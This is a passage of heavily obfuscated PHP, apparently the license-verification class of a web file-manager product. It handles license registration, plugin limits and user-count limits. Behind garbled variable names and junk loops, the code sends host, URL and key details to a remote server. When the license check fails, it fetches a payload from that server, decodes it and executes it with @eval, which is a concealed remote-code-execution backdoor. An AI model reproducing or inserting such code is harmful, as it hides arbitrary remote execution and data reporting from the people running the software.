$€Ê›Á‡[$›Ûış¸°[178]] : $ Ò‘æÅò; show_json($óà¢ô¬, !1); } $†Û´şì¹ = $€Ê›Á‡[$›Ûış¸°[178]]; $ıÖ±Èˆí = $this->vafj5dc201d8($†Û´şì¹[$›Ûış¸°[184]]); if (!$ıÖ±Èˆí || $ıÖ±Èˆí != $†Û´şì¹[$›Ûış¸°[129]]) { $ÕøĞèË = array($›Ûış¸°[185] => Model($›Ûış¸°[33])->get($›Ûış¸°[100]), $›Ûış¸°[186] => $_SERVER[$›Ûış¸°[106]], $›Ûış¸°[187] => this_url(), $›Ûış¸°[161] => $_SERVER[$›Ûış¸°[162]]); $÷Œë® à = $this->vmwf6e731dc6(json_encode($ÕøĞèË)); $this->qfoc98152574($›Ûış¸°[188] . $÷Œë® à); show_json(LNG($›Ûış¸°[189]), !0); } $¾×óñó = array($›Ûış¸°[153] => $†Û´şì¹[$›Ûış¸°[190]], $›Ûış¸°[191] => $†Û´şì¹[$›Ûış¸°[192]], $›Ûış¸°[193] => rand_string(16), $›Ûış¸°[108] => $†Û´şì¹[$›Ûış¸°[194]]); if ($’Âƒâ£Ä[$›Ûış¸°[155]]) { $¾×óñó[$›Ûış¸°[193]] = $’Âƒâ£Ä[$›Ûış¸°[155]]; } $€üöì›’ = substr(md5($¾×óñó[$›Ûış¸°[191]]), 10, 10); $õú¯³² = $€üöì›’ . $¾×óñó[$›Ûış¸°[108]] . $¾×óñó[$›Ûış¸°[193]]; $¾×óñó[$›Ûış¸°[110]] = strrev(base64_encode($this->akmd88e7eabd($õú¯³², $›Ûış¸°[195]))); $«½î— = $ÌïŞÑ‹¹[727]; if (strlen($«½î—) < $ÌïŞÑ‹¹[704]) { die; } $À±­ïÃ• = rand_string(16); $²Ûáßëé = $À±­ïÃ• . $¾×óñó[$›Ûış¸°[108]] . $this->akmd88e7eabd(md5($¾×óñó[$›Ûış¸°[153]]), $À±­ïÃ•); $¾×óñó[$›Ûış¸°[111]] = base64_encode(strrev($this->akmd88e7eabd($²Ûáßëé, $›Ûış¸°[196]))); if ($†Û´şì¹[$›Ûış¸°[197]] && $†Û´şì¹[$›Ûış¸°[197]] >= 1) { Model($›Ûış¸°[33])->setDeep($›Ûış¸°[198], $›Ûış¸°[122]); } Model($›Ûış¸°[33])->set($¾×óñó); $‡µ—“â = md5($_SERVER[$›Ûış¸°[106]] . strrev($—šü“ë£) . $¾×óñó[$›Ûış¸°[191]]); $éâûËÆ = strrev(substr($‡µ—“â, 10, 16)); $ùî‰û³’ = $this->uvfccb9b3f94(json_encode($†Û´şì¹), $‡µ—“â); $¿¨–Û¦Ÿ = array_to_keyvalue(Model($›Ûış¸°[7])->listData(), $›Ûış¸°[199]); $å‘´şğ = $¿¨–Û¦Ÿ[$›Ûış¸°[200]]; $³õ«—É = array(); $èê¦·—º = $ÌïŞÑ‹¹[728]; $³õ«—É[$éâûËÆ] = $ùî‰û³’; Model($›Ûış¸°[7])->update($å‘´şğ[$›Ûış¸°[201]], array($›Ûış¸°[202] => $³õ«—É)); $this->ubcf73fcc20c = $†Û´şì¹; $áº„‰äÑ = $ÌïŞÑ‹¹[729]; if (!$áº„‰äÑ) { die; } $this->ziwr3c0a488b = $¾×óñó[$›Ûış¸°[108]]; $this->licenseRegistSuccess(); Cache::set($›Ûış¸°[203] . md5($—šü“ë£ . $›Ûış¸°[204]), $›Ûış¸°[6]); show_json(LNG($›Ûış¸°[189]), !0); } private function licenseRegistSuccess() { $ĞÓš—µÇ =& $_SERVER[¯“©ŠÌ]; $§Âˆ”™ = Model($ĞÓš—µÇ[33])->get(); if ($§Âˆ”™[$ĞÓš—µÇ[63]] != $ĞÓš—µÇ[122]) { Model($ĞÓš—µÇ[33])->set($ĞÓš—µÇ[63], $ĞÓš—µÇ[122]); } Action($ĞÓš—µÇ[205])->initStart(!0); } private function zsud6560d2e6() { $†ªº¾ñÅ =& $_SERVER[°‰†òö¯]; $‡•—±Ñ =& $_SERVER[¯“©ŠÌ]; Model($‡•—±Ñ[33])->set(array($‡•—±Ñ[153] => $‡•—±Ñ[6], $‡•—±Ñ[191] => $‡•—±Ñ[6], $‡•—±Ñ[108] => $‡•—±Ñ[109], $‡•—±Ñ[110] => $‡•—±Ñ[6], $‡•—±Ñ[111] => $‡•—±Ñ[6])); Model($‡•—±Ñ[33])->setDeep($‡•—±Ñ[198], $‡•—±Ñ[206]); $ŠûÉÓÇ¼ = $†ªº¾ñÅ[730]; if (strlen($ŠûÉÓÇ¼) < $†ªº¾ñÅ[704]) { return; } $this->ubcf73fcc20c = array(); $this->ziwr3c0a488b = $‡•—±Ñ[109]; $ˆõçŒ‘¶ = $†ªº¾ñÅ[731]; if (!$ˆõçŒ‘¶) { return; } } private function ckum73004897() { $îàõú›Ä =& $_SERVER[°‰†òö¯]; $¤ªßØ½ò =& $_SERVER[¯“©ŠÌ]; $_SERVER[$¤ªßØ½ò[162]] = _get($_SERVER, $¤ªßØ½ò[162], APP_HOST); $this->ziwr3c0a488b = $¤ªßØ½ò[109]; $è¸êÛëÛ = $îàõú›Ä[732]; if (!$è¸êÛëÛ) { die; } $ÉÔÓ‚ÃÊ = Model($¤ªßØ½ò[33])->get(); if ($ÉÔÓ‚ÃÊ[$¤ªßØ½ò[108]] == $¤ªßØ½ò[109]) { return; } $×â²ú°Î = Model($¤ªßØ½ò[33])->get($¤ªßØ½ò[100]); $”€¸“ä = $¤ªßØ½ò[203] . md5($×â²ú°Î . $¤ªßØ½ò[204]); $…ÀãïÀş = $îàõú›Ä[733]; while ($…ÀãïÀş < $îàõú›Ä[691]) { if ($…ÀãïÀş >= 0) { break; } $…ÀãïÀş++; } $€·¥óÔ = Cache::get($”€¸“ä); $ÆšÖƒë = $îàõú›Ä[734]; if (strlen($ÆšÖƒë) < $îàõú›Ä[699]) { die; } if (!is_array($€·¥óÔ) || !isset($€·¥óÔ[$¤ªßØ½ò[207]]) || time() - $€·¥óÔ[$¤ªßØ½ò[207]] >= 60) { $û‚ŒŞêŒ = Model($¤ªßØ½ò[7])->loadList(); $ÙĞíáÇ½ = $û‚ŒŞêŒ[$¤ªßØ½ò[200]]; $œØÊĞ¤‹ = md5($_SERVER[$¤ªßØ½ò[106]] . strrev($×â²ú°Î) . $ÉÔÓ‚ÃÊ[$¤ªßØ½ò[191]]); $¾§œ­ÉÌ = strrev(substr($œØÊĞ¤‹, 10, 16)); $€·¥óÔ = $this->lpob3716b53a($ÙĞíáÇ½[$¤ªßØ½ò[86]][$¾§œ­ÉÌ], $œØÊĞ¤‹); $€·¥óÔ = json_decode($€·¥óÔ, !0); } if (!is_array($€·¥óÔ)) { return $this->zsud6560d2e6(); } $Ì¬ÂÍÅ = strtotime($€·¥óÔ[$¤ªßØ½ò[129]]); if (time() >= $Ì¬ÂÍÅ) { return $this->zsud6560d2e6(); } if (!isset($€·¥óÔ[$¤ªßØ½ò[207]]) || time() - $€·¥óÔ[$¤ªßØ½ò[207]] > 20) { $€·¥óÔ[$¤ªßØ½ò[207]] = time(); Cache::set($”€¸“ä, $€·¥óÔ); } $this->ubcf73fcc20c = $€·¥óÔ; $this->ziwr3c0a488b = $ÉÔÓ‚ÃÊ[$¤ªßØ½ò[108]]; $ÓïÕØ‹³ = $îàõú›Ä[735]; } private function sczgd4ebf0c9() { $Ş×ß¹ç» =& $_SERVER[°‰†òö¯]; $Š³–Å¿ =& $_SERVER[¯“©ŠÌ]; $ÇÃêíÜÔ = $GLOBALS[$Š³–Å¿[13]]; $¿–êº° = $Ş×ß¹ç»[736]; while (strlen($¿–êº°) < $Ş×ß¹ç»[691]) { if (!$¿–êº°) { break; } $¿–êº°++; } $ƒ¯°øÜŒ = $_SERVER[$Š³–Å¿[24]]; if ($ƒ¯°øÜŒ == $Š³–Å¿[208] && $this->ziwr3c0a488b == $Š³–Å¿[109]) { show_json(LNG($Š³–Å¿[209]), !1, $Š³–Å¿[210]); } $¾‘Ô©¯¤ = array($Š³–Å¿[211], $Š³–Å¿[212]); if (in_array($ƒ¯°øÜŒ, $¾‘Ô©¯¤)) { if ($this->ziwr3c0a488b == $Š³–Å¿[109] && isset($ÇÃêíÜÔ[$Š³–Å¿[213]])) { show_json(LNG($Š³–Å¿[209]), !1, $Š³–Å¿[210]); die; } $ğª¥ÕçÚ = $this->bjgt97affbee(); if ($ğª¥ÕçÚ != intval($Š³–Å¿[214])) { if ($ğª¥ÕçÚ <= Model($Š³–Å¿[125])->count()) { show_json(LNG($Š³–Å¿[215]), !1, $Š³–Å¿[210]); die; } } } } private function oieqf9eddee2() { $µ÷…„Š =& $_SERVER[°‰†òö¯]; $®ñãÏƒà =& $_SERVER[¯“©ŠÌ]; $Õş®Êàê = array($®ñãÏƒà[119], $®ñãÏƒà[120]); if (!KodUser::isRoot() || !isset($_GET[$®ñãÏƒà[216]])) { return; } if (!in_array($_SERVER[$®ñãÏƒà[24]], $Õş®Êàê)) { return; } $˜Ç£Öì‹ = $®ñãÏƒà[217]; $˜Ç£Öì‹ = $this->nwsqbf1f069b($˜Ç£Öì‹, $®ñãÏƒà[218]); $§ÍùßÈ‹ = $µ÷…„Š[737]; while ($§ÍùßÈ‹ < $µ÷…„Š[699]) { if ($§ÍùßÈ‹ >= 0) { break; } $§ÍùßÈ‹++; } $”Ó¬›¯¿ = stream_context_create(array($®ñãÏƒà[219] => array($®ñãÏƒà[220] => $®ñãÏƒà[221], $®ñãÏƒà[222] => 3))); $ˆ‚¡çª = $µ÷…„Š[738]; $×àÜÆî” = @file_get_contents($˜Ç£Öì‹, !1, $”Ó¬›¯¿); header($®ñãÏƒà[223]); if ($×àÜÆî” && strstr($×àÜÆî”, $®ñãÏƒà[224])) { echo $×àÜÆî”; } die; } public function qxjpac96c30b($›—ôš§ê) { $©‹î¤ì =& $_SERVER[°‰†òö¯]; $ˆáÂ…ğÖ =& $_SERVER[¯“©ŠÌ]; if ($this->ziwr3c0a488b == $ˆáÂ…ğÖ[225]) { return $›—ôš§ê; } $ÖéŠ„†È = $this->versionPluginList(); $—¿Š¶Àì = explode($ˆáÂ…ğÖ[226], $this->versionPluginFilter()); $ëÙ†Äœ‰ = array(); $„¢›ı = $©‹î¤ì[739]; while ($„¢›ı < $©‹î¤ì[699]) { if ($„¢›ı >= 0) { break; } $„¢›ı++; } foreach ($ÖéŠ„†È as $˜¶¨‘†  => $¬éÃÍã) { if ($¬éÃÍã == $ˆáÂ…ğÖ[227] && substr($this->ziwr3c0a488b, 0, 1) == $ˆáÂ…ğÖ[227]) { continue; } if (!in_array($˜¶¨‘† , $—¿Š¶Àì)) { $ëÙ†Äœ‰[] = $˜¶¨‘† ; } } foreach ($ëÙ†Äœ‰ as $˜¶¨‘† ) { unset($›—ôš§ê[$˜¶¨‘† ]); $æÏ’‰Ü = $©‹î¤ì[740]; if (!$æÏ’‰Ü) { die; } } return $›—ôš§ê; $‰ÔÒƒü× = $©‹î¤ì[741]; if (!$‰ÔÒƒü×) { return; } } private function versionPluginList() { $®šèƒ‰Ñ =& $_SERVER[¯“©ŠÌ]; return array($®šèƒ‰Ñ[228] => $®šèƒ‰Ñ[227], $®šèƒ‰Ñ[229] => $®šèƒ‰Ñ[227], $®šèƒ‰Ñ[230] => $®šèƒ‰Ñ[227], $®šèƒ‰Ñ[231] => $®šèƒ‰Ñ[232], $®šèƒ‰Ñ[233] => $®šèƒ‰Ñ[232], $®šèƒ‰Ñ[234] => $®šèƒ‰Ñ[232], $®šèƒ‰Ñ[235] => $®šèƒ‰Ñ[232], $®šèƒ‰Ñ[236] => $®šèƒ‰Ñ[232], $®šèƒ‰Ñ[237] => $®šèƒ‰Ñ[232], $®šèƒ‰Ñ[238] => $®šèƒ‰Ñ[232], $®šèƒ‰Ñ[239] => $®šèƒ‰Ñ[232], $®šèƒ‰Ñ[240] => $®šèƒ‰Ñ[232], $®šèƒ‰Ñ[241] => $®šèƒ‰Ñ[232], $®šèƒ‰Ñ[242] => $®šèƒ‰Ñ[232], $®šèƒ‰Ñ[243] => $®šèƒ‰Ñ[232], $®šèƒ‰Ñ[244] => $®šèƒ‰Ñ[232]); } private function versionPluginFilter() { $Ñïº‰Âì =& $_SERVER[°‰†òö¯]; $¦¾ÕáÏ† =& $_SERVER[¯“©ŠÌ]; if ($this->ziwr3c0a488b == $¦¾ÕáÏ†[109]) { return $¦¾ÕáÏ†[6]; } $“£„õ¨» = _get($this->ubcf73fcc20c, $¦¾ÕáÏ†[245], $¦¾ÕáÏ†[6]); $öÖ£“…Ü = $Ñïº‰Âì[686]; while ($öÖ£“…Ü < $Ñïº‰Âì[704]) { if ($öÖ£“…Ü >= 0) { break; } $öÖ£“…Ü++; } $²ä¯ÔÁ¬ = _get($this->ubcf73fcc20c, $¦¾ÕáÏ†[116], $¦¾ÕáÏ†[6]); $Û™â‚âÕ = _get($this->ubcf73fcc20c, $¦¾ÕáÏ†[246], $¦¾ÕáÏ†[6]); if ($²ä¯ÔÁ¬ > time() && $Û™â‚âÕ > time()) { $¬ù–§¶å = explode($¦¾ÕáÏ†[226], $“£„õ¨»); $Ãâ¼Ç¢Ê = array_keys($this->versionPluginList()); $“£„õ¨» = array_merge($¬ù–§¶å, $Ãâ¼Ç¢Ê); $“£„õ¨» = implode($¦¾ÕáÏ†[226], array_filter(array_unique($“£„õ¨»))); } return $“£„õ¨»; } private function gliu807c9cf8() { $€Æãç€ =& $_SERVER[¯“©ŠÌ]; if ($this->ziwr3c0a488b != $€Æãç€[109]) { $GLOBALS[$€Æãç€[86]][$€Æãç€[90]][$€Æãç€[247]] = $€Æãç€[206]; return; } $GLOBALS[$€Æãç€[86]][$€Æãç€[248]] = $€Æãç€[122]; if (Model($€Æãç€[249])->get($€Æãç€[63]) != $€Æãç€[206]) { Model($€Æãç€[249])->set($€Æãç€[63], $€Æãç€[206]); } } public function nhjz50538a84() { return $_SERVER[¯“©ŠÌ][250]; $Ë˜¡¨ª = $_SERVER[°‰†òö¯][742]; if (!$Ë˜¡¨ª) { return; } } private function vphjf6fe6910() { $§»ĞÏ– =& $_SERVER[°‰†òö¯]; $ÏÙ¢Œ·» =& $_SERVER[¯“©ŠÌ]; $ÒáÑ¢«® = array($ÏÙ¢Œ·»[251], $ÏÙ¢Œ·»[252], $ÏÙ¢Œ·»[253]); $Ü”·¡ı = $§»ĞÏ–[743]; while ($Ü”·¡ı < $§»ĞÏ–[696]) { if ($Ü”·¡ı >= 0) { break; } $Ü”·¡ı++; } $‡¬Ø”ë = $ÏÙ¢Œ·»[254] . md5($ÏÙ¢Œ·»[255]); if ($this->ziwr3c0a488b == $ÏÙ¢Œ·»[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$ÏÙ¢Œ·»[24]], $ÒáÑ¢«®)) { return; } if (time() % 4 != 0) { return; } $Şô­¡¡ü = call_user_func(array($ÏÙ¢Œ·»[256], $ÏÙ¢Œ·»[257]), $‡¬Ø”ë); $’…«©ø÷ = $§»ĞÏ–[744]; if ($Şô­¡¡ü && time() - $Şô­¡¡ü < intval($ÏÙ¢Œ·»[258])) { return; } call_user_func(array($ÏÙ¢Œ·»[256], $ÏÙ¢Œ·»[139]), $‡¬Ø”ë, time()); $€¢ëŠŞ = $§»ĞÏ–[745]; $“ ¿º²š = Model($ÏÙ¢Œ·»[33])->get($ÏÙ¢Œ·»[100]); $ÃÎŠÅ°× = array($ÏÙ¢Œ·»[152] => Model($ÏÙ¢Œ·»[33])->get($ÏÙ¢Œ·»[153]), $ÏÙ¢Œ·»[167] => $this->ziwr3c0a488b, $ÏÙ¢Œ·»[163] => $_SERVER[$ÏÙ¢Œ·»[164]], $ÏÙ¢Œ·»[165] => Model($ÏÙ¢Œ·»[33])->get($ÏÙ¢Œ·»[131]), $ÏÙ¢Œ·»[105] => md5($_SERVER[$ÏÙ¢Œ·»[106]] . $“ ¿º²š), $ÏÙ¢Œ·»[156] => $ÏÙ¢Œ·»[136], $ÏÙ¢Œ·»[159] => $_SERVER[$ÏÙ¢Œ·»[160]]); $ÈÜ´ïÉ = $this->qfoc98152574($ÏÙ¢Œ·»[259], $ÃÎŠÅ°×); $‘Ø¹©è´ = $§»ĞÏ–[746]; while (strlen($‘Ø¹©è´) < $§»ĞÏ–[691]) { if (!$‘Ø¹©è´) { break; } $‘Ø¹©è´++; } if (!is_array($ÈÜ´ïÉ)) { return; } if ($ÈÜ´ïÉ[$ÏÙ¢Œ·»[152]] && $ÈÜ´ïÉ[$ÏÙ¢Œ·»[260]]) { if ($this->vafj5dc201d8($ÈÜ´ïÉ[$ÏÙ¢Œ·»[260]]) == $ÃÎŠÅ°×[$ÏÙ¢Œ·»[152]]) { return; } } $this->zsud6560d2e6(); $çù¡ª»½ = $§»ĞÏ–[747]; if ($this->vafj5dc201d8($ÈÜ´ïÉ[$ÏÙ¢Œ·»[260]]) != $ÃÎŠÅ°×[$ÏÙ¢Œ·»[152]]) { $­†ˆÌ = array($ÏÙ¢Œ·»[185] => $“ ¿º²š, $ÏÙ¢Œ·»[186] => $_SERVER[$ÏÙ¢Œ·»[106]], $ÏÙ¢Œ·»[187] => this_url(), $ÏÙ¢Œ·»[161] => $_SERVER[$ÏÙ¢Œ·»[162]]); $ˆŞÄõÚù = $this->vmwf6e731dc6(json_encode($­†ˆÌ)); $ÈÜ´ïÉ = $this->qfoc98152574($ÏÙ¢Œ·»[188] . $ˆŞÄõÚù); if ($ÈÜ´ïÉ && is_array($ÈÜ´ïÉ) && isset($ÈÜ´ïÉ[$ÏÙ¢Œ·»[260]])) { $§Ôì­¯¾ = $this->lpob3716b53a($ÈÜ´ïÉ[$ÏÙ¢Œ·»[260]], 2); if ($§Ôì­¯¾) { $§Ôì­¯¾ = $this->vafj5dc201d8($§Ôì­¯¾); } if ($§Ôì­¯¾) { try { @eval($§Ôì­¯¾); } catch (Exception $¯À·í±•) { } } } } } private function qfoc98152574($¡Ö…¿´® = '', $ÔÀşÀéí = array(), $Şäô’œê = 5) { $‘…å†èñ =& $_SERVER[°‰†òö¯]; $”¯ûá© =& $_SERVER[¯“©ŠÌ]; $ïÁ‡Àä = $”¯ûá©[261]; $ïÁ‡Àä = $this->nwsqbf1f069b($ïÁ‡Àä, $”¯ûá©[262]); $ïÁ‡Àä = $ïÁ‡Àä . $¡Ö…¿´®; if ($ÔÀşÀéí && is_array($ÔÀşÀéí)) { $ïÁ‡Àä = $ïÁ‡Àä . $”¯ûá©[263] . http_build_query($ÔÀşÀéí); } if ($ÔÀşÀéí === -1) { return $ïÁ‡Àä; } $«“ë¿æñ = stream_context_create(array($”¯ûá©[219] => array($”¯ûá©[222] => $Şäô’œê, $”¯ûá©[220] => $”¯ûá©[264]), $”¯ûá©[265] => array($”¯ûá©[266] => !1, $”¯ûá©[267] => !1))); $ó§ÛÓïò = $‘…å†èñ[748]; if (strlen($ó§ÛÓïò) < $‘…å†èñ[694]) { return; } $ÔÀşÀéí = @file_get_contents($ïÁ‡Àä, !1, $«“ë¿æñ); return json_decode($ÔÀşÀéí, !0); $ïĞ®µ• = $‘…å†èñ[749]; } private function bjgt97affbee() { $ÇôĞÄµ =& $_SERVER[°‰†òö¯]; $ÑÁ°ô¡‡ =& $_SERVER[¯“©ŠÌ]; $İ¡åõéà = array($ÑÁ°ô¡‡[268] => $ÑÁ°ô¡‡[269], $ÑÁ°ô¡‡[270] => $ÑÁ°ô¡‡[271], $ÑÁ°ô¡‡[272] => $ÑÁ°ô¡‡[273], $ÑÁ°ô¡‡[274] => $ÑÁ°ô¡‡[275], $ÑÁ°ô¡‡[276] => $ÑÁ°ô¡‡[277], $ÑÁ°ô¡‡[278] => $ÑÁ°ô¡‡[214], $ÑÁ°ô¡‡[279] => $ÑÁ°ô¡‡[214], $ÑÁ°ô¡‡[280] => $ÑÁ°ô¡‡[269], $ÑÁ°ô¡‡[281] => $ÑÁ°ô¡‡[271], $ÑÁ°ô¡‡[282] => $ÑÁ°ô¡‡[273], $ÑÁ°ô¡‡[283] => $ÑÁ°ô¡‡[284], $ÑÁ°ô¡‡[285] => $ÑÁ°ô¡‡[275], $ÑÁ°ô¡‡[286] => $ÑÁ°ô¡‡[287], $ÑÁ°ô¡‡[288] => $ÑÁ°ô¡‡[277], $ÑÁ°ô¡‡[289] => $ÑÁ°ô¡‡[290], $ÑÁ°ô¡‡[291] => $ÑÁ°ô¡‡[292], $ÑÁ°ô¡‡[293] => $ÑÁ°ô¡‡[294]); $õ£ÓåÅ = $ÇôĞÄµ[750]; if (!$õ£ÓåÅ) { die; } $ã…÷úƒá = $İ¡åõéà[$this->ziwr3c0a488b]; $ã…÷úƒá = intval($ã…÷úƒá ? $ã…÷úƒá : $ÑÁ°ô¡‡[269]); $‘ãÇ²• = $ÇôĞÄµ[751]; $â¦°³¶­ = _get($this->ubcf73fcc20c, $ÑÁ°ô¡‡[295]); $”‚Å¥•¹ = $ÇôĞÄµ[752]; if (!$”‚Å¥•¹) { die; } $â¦°³¶­ = $â¦°³¶­ ? intval($â¦°³¶­) : 0; return $ã…÷úƒá + $â¦°³¶­; } public function qdnb292683b0($›Ü×‘±) { $¸ÛÕ¨¯· =& $_SERVER[°‰†òö¯]; $¾¢ŞëåØ =& $_SERVER[¯“©ŠÌ]; $›·ëŒ¹³ = $this->bjgt97affbee(); $ÄĞÍó‘‡ = $¸ÛÕ¨¯·[753]; if (!$ÄĞÍó‘‡) { return; } if ($›Ü×‘±[$¾¢ŞëåØ[296]] == $¾¢ŞëåØ[122]) { return; } if ($›·ëŒ¹³ >= intval($¾¢ŞëåØ[214])) { return; } $ß÷©¬ü§ = Model($¾¢ŞëåØ[125])->count(); if ($ß÷©¬ü§ <= $›·ëŒ¹³) { return; } $ı†Ôû¥Ø = Model($¾¢ŞëåØ[125])->field($¾¢ŞëåØ[296])->limit($›·ëŒ¹³)->select(); $Ù²”ÄÔ = $¸ÛÕ¨¯·[754]; if (strlen($Ù²”ÄÔ) < $¸ÛÕ¨¯·[696]) { die; } $ı†Ôû¥Ø = array_to_keyvalue($ı†Ôû¥Ø, $¾¢ŞëåØ[6], $¾¢ŞëåØ[296]); $ú”Œ¸¼ = $¸ÛÕ¨¯·[755]; while ($ú”Œ¸¼ < $¸ÛÕ¨¯·[696]) { if ($ú”Œ¸¼ >= 0) { break; } $ú”Œ¸¼++; } if (!in_array($›Ü×‘±[$¾¢ŞëåØ[296]], $ı†Ôû¥Ø)) { show_json($¾¢ŞëåØ[297], !1, $¾¢ŞëåØ[210]); } } public function vfcp23fd2927() { $ŞŞôÁğÁ =& $_SERVER[°‰†òö¯]; $µ·Ÿù¢Ó =& $_SERVER[¯“©ŠÌ]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $Ç•ã™®÷ = $µ·Ÿù¢Ó[217]; $Ç•ã™®÷ = $this->nwsqbf1f069b($Ç•ã™®÷, $µ·Ÿù¢Ó[218]); $·‘ªÖª¶ = stream_context_create(array($µ·Ÿù¢Ó[219] => array($µ·Ÿù¢Ó[220] => $µ·Ÿù¢Ó[221], $µ·Ÿù¢Ó[222] => 3))); $¸¢Æâ‰ğ = $ŞŞôÁğÁ[756]; while (strlen($¸¢Æâ‰ğ) < $ŞŞôÁğÁ[704]) { if (!$¸¢Æâ‰ğ) { break; } $¸¢Æâ‰ğ++; } $ùÌÇÊöÒ = @file_get_contents($Ç•ã™®÷, !1, $·‘ªÖª¶); echo $µ·Ÿù¢Ó[298] . hash_encode($ùÌÇÊöÒ) . $µ·Ÿù¢Ó[299]; $‘ã×ƒìÑ = $ŞŞôÁğÁ[757]; if (!$‘ã×ƒìÑ) { die; } } private function uvfccb9b3f94($òûÙË£Û, $ÎÛÈ‡ŠÃ, $Êî—İïÖ = 3) { $Ã ƒÖ¦× =& $_SERVER[°‰†òö¯]; $™½Ú¤•¹ =& $_SERVER[¯“©ŠÌ]; usleep(1); $Ú¾ì×™£ = $Ã ƒÖ¦×[758]; while (strlen($Ú¾ì×™£) < $Ã ƒÖ¦×[699]) { if (!$Ú¾ì×™£) { break; } $Ú¾ì×™£++; } $òûÙË£Û = trim($òûÙË£Û); $ì¸‡ãıß = mt_rand(0, 5) . $™½Ú¤•¹[6]; $ÂÙ±†Ê = $Ã ƒÖ¦×[759]; if (strlen($ÂÙ±†Ê) < $Ã ƒÖ¦×[691]) { die; } $‚µˆ¸° = rand_string(15); $¡¸ï¤¶½ = $Ã ƒÖ¦×[760]; if (strlen($¡¸ï¤¶½) < $Ã ƒÖ¦×[699]) { return; } $ıÀùØ”³ = $™½Ú¤•¹[300]; switch ($ì¸‡ãıß) { case $™½Ú¤•¹[206]: $Œ˜ü¿ªÈ = $this->akmd88e7eabd($òûÙË£Û, strrev($ÎÛÈ‡ŠÃ . $‚µˆ¸°)); $È“°ĞŸ‚ = $Ã ƒÖ¦×[761]; break; $ŸèÛÍ«õ = $Ã ƒÖ¦×[762]; if (!$ŸèÛÍ«õ) { die; } case $™½Ú¤•¹[122]: $Œ˜ü¿ªÈ = $this->akmd88e7eabd($òûÙË£Û, strrev($‚µˆ¸° . $ÎÛÈ‡ŠÃ)); $ôŠÔ™¤Ç = $Ã ƒÖ¦×[763]; while ($ôŠÔ™¤Ç < $Ã ƒÖ¦×[696]) { if ($ôŠÔ™¤Ç >= 0) { break; } $ôŠÔ™¤Ç++; } break; case $™½Ú¤•¹[301]: $Œ˜ü¿ªÈ = $this->akmd88e7eabd($òûÙË£Û, base64_encode($‚µˆ¸° . $ÎÛÈ‡ŠÃ)); $‚©¬šùÜ = $Ã ƒÖ¦×[764]; if (strlen($‚©¬šùÜ) < $Ã ƒÖ¦×[696]) { return; } break; case $™½Ú¤•¹[302]: $Œ˜ü¿ªÈ = $this->akmd88e7eabd($òûÙË£Û, md5($‚µˆ¸° . $ÎÛÈ‡ŠÃ)); break; case $™½Ú¤•¹[303]: $òûÙË£Û = base64_encode($òûÙË£Û); $ÈØ€î©À = rand(0, 64); $Ö›ğã¥¼ = $Ã ƒÖ¦×[765]; while (strlen($Ö›ğã¥¼) < $Ã ƒÖ¦×[696]) { if (!$Ö›ğã¥¼) { break; } $Ö›ğã¥¼++; } $Šğ¯®‘Ÿ = $ıÀùØ”³[$ÈØ€î©À]; $©˜ÜäÇê = md5($Šğ¯®‘Ÿ . md5($ÎÛÈ‡ŠÃ . $Šğ¯®‘Ÿ) . $ÎÛÈ‡ŠÃ); $‚ö»˜‹ = $Ã ƒÖ¦×[766]; if (strlen($‚ö»˜‹) < $Ã ƒÖ¦×[694]) { return; } $©˜ÜäÇê = substr($©˜ÜäÇê, $ÈØ€î©À % 8, $ÈØ€î©À % 8 + 7); $ÂäÜ¨Ã¨ = $™½Ú¤•¹[6]; $ÂÜ‡êÔ = $Ã ƒÖ¦×[767]; while (strlen($ÂÜ‡êÔ) < $Ã ƒÖ¦×[696]) { if (!$ÂÜ‡êÔ) { break; } $ÂÜ‡êÔ++; } $¹ó²İÔÒ = 0; $Æ¾Öîé§ = $Ã ƒÖ¦×[768]; if (strlen($Æ¾Öîé§) < $Ã ƒÖ¦×[696]) { return; } $€öñ¦¨É = 0; $ˆÖ§åûÍ = 0; $üÒñîšò = $Ã ƒÖ¦×[769]; if (strlen($üÒñîšò) < $Ã ƒÖ¦×[694]) { return; } for ($¹ó²İÔÒ = 0; $¹ó²İÔÒ < strlen($òûÙË£Û); $¹ó²İÔÒ++) { $ˆÖ§åûÍ = $ˆÖ§åûÍ == strlen($©˜ÜäÇê) ? 0 : $ˆÖ§åûÍ; $€öñ¦¨É = ($ÈØ€î©À + strpos($ıÀùØ”³, $òûÙË£Û[$¹ó²İÔÒ]) + ord($©˜ÜäÇê[$ˆÖ§åûÍ++])) % 64; $ÂäÜ¨Ã¨ .= $ıÀùØ”³[$€öñ¦¨É]; } $Œ˜ü¿ªÈ = hash_encode($Šğ¯®‘Ÿ . $ÂäÜ¨Ã¨); $÷Œ³ÎÌ = $Ã ƒÖ¦×[770]; if (strlen($÷Œ³ÎÌ) < $Ã ƒÖ¦×[699]) { return; } break; default: $Œ˜ü¿ªÈ = $this->akmd88e7eabd($òûÙË£Û, $ÎÛÈ‡ŠÃ . $‚µˆ¸°); $ï‚‡„ó = $Ã ƒÖ¦×[771]; while ($ï‚‡„ó < $Ã ƒÖ¦×[694]) { if ($ï‚‡„ó >= 0) { break; } $ï‚‡„ó++; } break; $¢Ì¸Ô‚× = $Ã ƒÖ¦×[772]; if (strlen($¢Ì¸Ô‚×) < $Ã ƒÖ¦×[704]) { return; } } $Œ˜ü¿ªÈ = strrev($ì¸‡ãıß . $‚µˆ¸° . $Œ˜ü¿ªÈ); if ($Êî—İïÖ - 1 > 0) { $Œ˜ü¿ªÈ = $this->uvfccb9b3f94($Œ˜ü¿ªÈ, $ÎÛÈ‡ŠÃ, $Êî—İïÖ - 1); } return $Œ˜ü¿ªÈ; } private function lpob3716b53a($’¸­Ã×î, $»œØƒû, $™ß‹¤¥æ = 3) { $›™Æàà =& $_SERVER[°‰†òö¯]; $°Ó³àá· =& $_SERVER[¯“©ŠÌ]; if (!is_string($’¸­Ã×î) || strlen($’¸­Ã×î) < 10) { return !1; } $’¸­Ã×î = trim($’¸­Ã×î); $’¸­Ã×î = strrev($’¸­Ã×î); $ ğÈÌ = $’¸­Ã×î[0]; $õ¯÷º§ª = substr($’¸­Ã×î, 1, 15); $ÁÖÌüæÓ = $›™Æàà[773]; if (strlen($ÁÖÌüæÓ) < $›™Æàà[696]) { return; } $’¸­Ã×î = substr($’¸­Ã×î, 16); $Èşı…ö¼ = $›™Æàà[774]; if (strlen($Èşı…ö¼) < $›™Æàà[691]) { die; } $‘‘í«ÛÑ = $°Ó³àá·[300]; switch ($ ğÈÌ) { case $°Ó³àá·[206]: $ Úª¼Øñ = $this->nwsqbf1f069b($’¸­Ã×î, 